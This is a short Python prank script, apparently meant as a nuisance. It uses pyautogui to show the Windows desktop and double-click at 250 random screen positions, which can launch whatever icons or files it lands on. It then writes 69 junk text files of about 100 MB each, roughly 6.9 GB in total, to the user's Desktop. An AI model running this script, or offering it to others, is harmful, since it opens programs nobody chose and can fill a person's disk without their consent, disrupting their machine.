import pyautogui
import time
import os
import random

def open_desktop():
    pyautogui.hotkey('winleft', 'd')

def double_click_randomly():
    desktop_width, desktop_height = pyautogui.size()

    for _ in range(250):
        x = random.randint(0, desktop_width - 1)
        y = random.randint(0, desktop_height - 1)
        
        pyautogui.moveTo(x, y)
        pyautogui.doubleClick()
        
        time.sleep(0.05)

def create_large_text_files():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_content = "Damn bro, that's mad."
    file_size_mb = 100

    for i in range(69):
        file_name = f"E_du_dum_{i + 1}.txt"
        file_path = os.path.join(desktop_path, file_name)

        try:
            with open(file_path, 'w') as file:
                file.write(file_content * (file_size_mb * 1024 * 1024 // len(file_content)))
        except Exception as e:
            print(f"Error creating file {file_name}: {e}")


if __name__ == "__main__":
    open_desktop()
    time.sleep(0.004)
    double_click_randomly()
    create_large_text_files()
